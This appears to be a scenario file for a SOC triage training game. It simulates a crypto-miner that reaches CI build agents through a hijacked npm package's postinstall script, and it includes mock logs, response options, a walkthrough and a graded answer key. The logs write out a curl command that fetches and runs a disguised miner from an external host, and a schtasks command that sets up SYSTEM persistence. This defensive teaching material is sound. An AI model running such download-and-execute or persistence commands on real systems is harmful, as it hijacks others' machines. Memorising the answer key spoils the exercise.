// Mining traffic from a build server. The mining is the cheap part — the
// expensive part is that the thing which started it arrived through the
// dependency chain of a CI job that holds deployment credentials.
//
// See ./index.js for the shape every scenario follows.

export default {
  id: 'crypto-mining-build-agent',
  difficulty: 2,
  queueLabel: 'IDS Alert — Stratum mining protocol from BUILD-AGENT-04',
  source: 'Suricata IDS',
  alert: {
    ref: 'ALT-2026-0821-0559',
    rule: 'ET POLICY Cryptocurrency Miner Stratum protocol handshake',
    ruleId: 'SID-2028316',
    reportedSeverity: 'MEDIUM',
    detectedAt: '2026-08-21 03:12:07 UTC',
    slaMinutes: 120,
    entities: [
      { label: 'Source', value: 'BUILD-AGENT-04 (10.20.31.18)' },
      { label: 'Destination', value: 'pool.hashvault-eu.com:3333' },
      { label: 'Duration', value: 'Continuous since 02:58' },
    ],
  },
  rawLog:
`{"timestamp":"2026-08-21T03:12:07Z","event_type":"alert","src_ip":"10.20.31.18","dest":"pool.hashvault-eu.com:3333","alert":{"signature":"ET POLICY Cryptocurrency Miner Stratum protocol handshake","category":"Potential Corporate Privacy Violation","severity":3},"flow":{"first_seen":"2026-08-21T02:58:44Z","bytes_toserver":"4.1MB","state":"established"}}`,
  datasets: [
    { index: 'edr', label: 'CrowdStrike process telemetry', retention: '90d' },
    { index: 'ci', label: 'Build pipeline job logs', retention: '180d' },
    { index: 'asset', label: 'Asset inventory & ownership', retention: 'current state' },
    { index: 'net', label: 'Perimeter firewall / netflow', retention: '30d' },
  ],
  searches: [
    {
      id: 's11-edr-proc',
      label: 'process activity on BUILD-AGENT-04',
      match: { index: 'edr', terms: ['build-agent-04'] },
      needsWindow: 1440,
      columns: ['_time', 'user', 'process', 'command_line'],
      events: [
        { _time: '02:57:40', user: 'svc-build', process: 'node.exe', command_line: 'npm install (job #8841, branch feature/statement-pdf)' },
        { _time: '02:58:02', user: 'svc-build', process: 'node.exe', command_line: 'node ./node_modules/pdf-glyph-tools/postinstall.js' },
        { _time: '02:58:31', user: 'svc-build', process: 'curl.exe', command_line: 'curl -sL https://cdn.hashvault-eu.com/x/m64 -o %TEMP%\\svchost32.exe' },
        { _time: '02:58:44', user: 'svc-build', process: 'svchost32.exe', command_line: '%TEMP%\\svchost32.exe -o pool.hashvault-eu.com:3333 -u 48Hb...9Qk --background' },
        { _time: '02:59:10', user: 'svc-build', process: 'schtasks.exe', command_line: 'schtasks /create /tn "OneDriveSync32" /tr %TEMP%\\svchost32.exe /sc onstart /ru SYSTEM' },
      ],
      note: 'A package postinstall script fetched and ran a miner, then registered a scheduled task to survive reboot. The postinstall hook is the interesting part: this arrived through the dependency chain, not through a person.',
    },
    {
      id: 's11-ci-job',
      label: 'build job log for the run that started it',
      match: { index: 'ci', terms: ['8841'] },
      needsWindow: 1440,
      columns: ['_time', 'job', 'detail'],
      events: [
        { _time: '02:57:33', job: '#8841', detail: 'triggered by push to feature/statement-pdf (author: dkraft)' },
        { _time: '02:57:40', job: '#8841', detail: 'npm install — added 214 packages, including pdf-glyph-tools@2.4.1 (first use in this repository)' },
        { _time: '02:57:41', job: '#8841', detail: 'pdf-glyph-tools@2.4.1 published 2026-08-19, 2 days old; previous version 2.4.0 published 2024-03-11' },
        { _time: '03:04:52', job: '#8841', detail: 'build succeeded, artifact published to internal registry' },
      ],
      note: 'A dormant package woke up with a new version two days ago and gained a postinstall script. The build it ran in succeeded and published an artifact — which is the question that outlives the miner.',
    },
    {
      id: 's11-asset-agent',
      label: 'asset record for BUILD-AGENT-04',
      match: { index: 'asset', terms: ['build-agent-04'] },
      needsWindow: 0,
      columns: ['field', 'value'],
      events: [
        { field: 'Function', value: 'CI build agent — statements and document services' },
        { field: 'Owner', value: 'Platform Engineering' },
        { field: 'Credentials on host', value: 'Deployment token for the internal artifact registry; read key for the signing service' },
        { field: 'Network reach', value: 'Internal registry, signing service, staging environment' },
        { field: 'Rebuilt', value: 'From image on demand — no unique data held' },
      ],
      note: 'The host is disposable; the credentials on it are not. Anything that ran as svc-build could have read them, which is what makes this more than a power-bill problem.',
    },
    {
      id: 's11-net-pool',
      label: 'other hosts talking to the mining pool',
      match: { index: 'net', terms: ['hashvault-eu.com'] },
      needsWindow: 10080,
      columns: ['_time', 'src', 'dest', 'state'],
      events: [
        { _time: 'Aug 21 02:58 →', src: 'BUILD-AGENT-04', dest: 'pool.hashvault-eu.com:3333', state: 'established, ongoing' },
        { _time: 'Aug 21 03:41 →', src: 'BUILD-AGENT-02', dest: 'pool.hashvault-eu.com:3333', state: 'established, ongoing' },
      ],
      note: 'A second agent started mining 43 minutes later — the same dependency, pulled by the next job that ran. Scope is two hosts, not one, and it will keep growing while that package version is installable.',
    },
  ],
  intel: {
    'pool.hashvault-eu.com': {
      verdict: 'malicious',
      summary: 'Mining pool endpoint bundled into a series of typosquatted and hijacked npm packages distributing XMRig-family miners through postinstall scripts.',
      firstSeen: '2026-08-19',
      sources: ['Commercial threat feed', 'Open-source package advisory'],
      context: 'The advisory names pdf-glyph-tools 2.4.1 as a maintainer-account takeover: a dormant package republished with a postinstall payload.',
    },
  },
  actions: [
    {
      id: 'isolate-agents',
      label: 'Isolate BUILD-AGENT-04 and BUILD-AGENT-02 and stop the running jobs',
      verdict: 'required',
      result: 'Both agents contained at 03:55. Mining stops; the queued pipeline pauses rather than infecting a third agent.',
    },
    {
      id: 'rotate-build-creds',
      label: 'Rotate the deployment token and signing service key held on the build agents',
      verdict: 'required',
      result: 'Credentials rotated and the old ones revoked. Anything the miner’s parent process could read is now worthless.',
    },
    {
      id: 'block-package-version',
      label: 'Block pdf-glyph-tools@2.4.1 in the internal package proxy',
      verdict: 'required',
      result: 'The version is denied at the proxy, so the next build cannot re-introduce it. The 2.4.0 release stays available.',
    },
    {
      id: 'wipe-and-close',
      label: 'Rebuild both agents from the image and close the alert as resolved',
      verdict: 'harmful',
      result: 'Agents rebuilt clean and the alert is closed. The credentials they held were never rotated, the package is still installable, and the artifact published by job #8841 is still in the registry.',
      consequence: {
        from: 'Marcus Bell',
        role: 'IR Lead',
        tone: 'concerned',
        message: 'Rebuilding the host removes the miner and nothing else. Code ran as the build identity on a machine holding a deployment token and a signing key — the credentials and the artifact it produced are the actual incident, and you closed it before anyone looked at either.',
      },
    },
    {
      id: 'block-mining-domains-only',
      label: 'Block the mining domain at the proxy and leave the agents running',
      verdict: 'harmful',
      result: 'Mining traffic stops. The postinstall payload still executes on every build, the scheduled task still runs as SYSTEM, and the alert that would have told you stops firing.',
      consequence: {
        from: 'Tom Alvarez',
        role: 'Security Engineering Manager',
        tone: 'concerned',
        message: 'Blocking the destination silenced your own detection without removing anything. The next payload that package ships will not call a mining pool, and now nothing is watching those agents.',
      },
    },
    {
      id: 'notify-platform',
      label: 'Notify Platform Engineering and the branch author that the pipeline is paused and why',
      verdict: 'acceptable',
      result: 'Platform on-call confirms no legitimate change introduced the package and starts a review of what job #8841 published.',
    },
    {
      id: 'page-ir',
      label: 'Page the on-call Incident Response engineer',
      verdict: 'unnecessary',
      result: 'IR paged at 04:02 and hands it back to Tier 2 with a note to call them if the signing key turns out to have been used.',
      consequence: {
        from: 'Marcus Bell',
        role: 'IR Lead',
        tone: 'neutral',
        message: 'Reasonable instinct, wrong threshold. Contained hosts with rotated credentials and no evidence of use is a Tier 2 hunt. Page me if the signing key shows activity you cannot account for.',
      },
    },
  ],
  truth: {
    classification: 'true_positive',
    severity: 'HIGH',
    mitreTechnique: 'T1496',
    mitreTactic: 'Impact',
    escalation: 'escalate_tier2',
    responseTargetMinutes: 60,
    requiredSearches: ['s11-edr-proc', 's11-ci-job', 's11-asset-agent'],
    requiredIntel: ['pool.hashvault-eu.com'],
    requiredActions: ['isolate-agents', 'rotate-build-creds', 'block-package-version'],
    requiredReportPoints: [
      {
        point: 'traces the miner to a package postinstall script in the build, not to a user action',
        any: ['postinstall', 'post-install', 'dependency', 'package', 'npm', 'pdf-glyph-tools', 'supply chain', 'build'],
      },
      {
        point: 'states that code executed as the build identity on a host holding deployment and signing credentials',
        any: ['svc-build', 'deployment token', 'signing', 'credential*', 'secret*', 'token', 'build identity'],
      },
      {
        point: 'scopes it to both agents and notes it spreads with every job that installs the package',
        any: ['two', 'both', 'build-agent-02', 'second agent', 'spread*', 'other agent*', 'each build', 'every job'],
      },
      {
        point: 'names the persistence — a scheduled task running as SYSTEM',
        any: ['scheduled task', 'schtasks', 'onedrivesync32', 'persistence', 'survives reboot', 'system'],
      },
      {
        point: 'does not treat rebuilding the hosts or blocking the pool as sufficient on its own',
        none: ['rebuild and close', 'simply rebuild', 'just rebuild', 'blocking the pool resolves', 'block the domain and close'],
      },
    ],
  },
  walkthrough: [
    'The signature is a policy alert, which is easy to read as "somebody installed a miner" and close. Check who ran it before you decide what it is.',
    '`index=edr build-agent-04` shows npm install, then a package postinstall script, then curl fetching a binary, then the miner, then a scheduled task as SYSTEM. No human is in that chain.',
    '`index=ci 8841` names the package: pdf-glyph-tools 2.4.1, published two days ago against a version that had been dormant since 2024, and the build that installed it succeeded and published an artifact.',
    'Look up pool.hashvault-eu.com — the advisory names that package version as a maintainer-account takeover. Your one host is part of a campaign.',
    '`index=asset build-agent-04` is what sets the severity. The host is disposable, but it holds a deployment token and a signing-service key, and anything running as svc-build could read them.',
    '`index=net hashvault-eu.com` shows a second agent already mining. Contain both, rotate the credentials, and block the package version at the proxy so the next job cannot pull it back in.',
    'Classify True Positive at HIGH and route to Tier 2, with the open question stated plainly: what did job #8841 publish, and was the signing key used. Paging IR is not wrong, just early.',
  ],
  debrief:
`Mining alerts get triaged as nuisance because the payload is boring, and that is the trap. The miner is the part you can see; the part that matters is that arbitrary code from a public package ran as the build identity on a machine holding a deployment token and a signing key. Anything that could mine could also have read those, and a build that publishes signed artifacts is a supply chain of its own.

The right severity here is a judgement call with a defensible answer: HIGH because credentials and a published artifact are in scope, Tier 2 rather than IR because the hosts are contained, the credentials are rotated, and there is no evidence yet that either was used. Stating that open question in the handover — what did job #8841 publish, and did the signing key get used — is what makes the escalation useful to whoever picks it up.`,
};
